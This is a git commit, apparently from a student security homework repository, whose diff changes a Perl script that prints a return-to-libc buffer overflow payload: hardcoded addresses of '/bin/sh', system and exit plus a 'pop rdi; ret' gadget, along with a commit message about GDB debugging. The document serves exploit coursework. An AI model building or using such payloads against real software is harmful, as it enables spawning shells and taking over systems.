c0ddde1a711f82b15ec2b42ba69956023ebced6c
Nikos Koxenoglou <koxakin@gmail.com>
2017-05-02 18:23:18 +0300

    GDB recognices /bin/sh and other addresses for what they are/ RDI loads wrong address/ Wrong RSP for some reason

--- hw2/badfile_loader.pl
+++ hw2/badfile_loader.pl
@@ -1,18 +1,17 @@
 #!/usr/bin/perl
 
-#0x 7f ff f7 b9 a1 77
+
+#0x00 00 7f ff f7 b9 a1 77
 # Address of /bin/sh
-print "\x77\xa1\xb9\xf7\xff\x7f";
+print "\x77\xa1\xb9\xf7\xff\x7f\x00\x00";
 
-#0x7f ff f7 b9 a3 ea
+#0x7f ff f7 a5 33 90
 # Address of System
-print "\xea\xa3\xb9\xf7\xff\x7f";
+print "\x90\x30\xa5\xf7\xff\x7f\x00\x00";
 
-#0x7f ff f7 a1 fc 4d
+#0x7f ff f7 a4 80 30
 # Address of exit
-print "\x4d\xfc\xa1\xf7\xff\x7f";
-
-print "\x90"x6;
+print "\x30\x80\xa4\xf7\xff\x7f\x00\x00";
 
 #0x00 00 00 00 00 40 06 e3
 # pop rdi; ret;
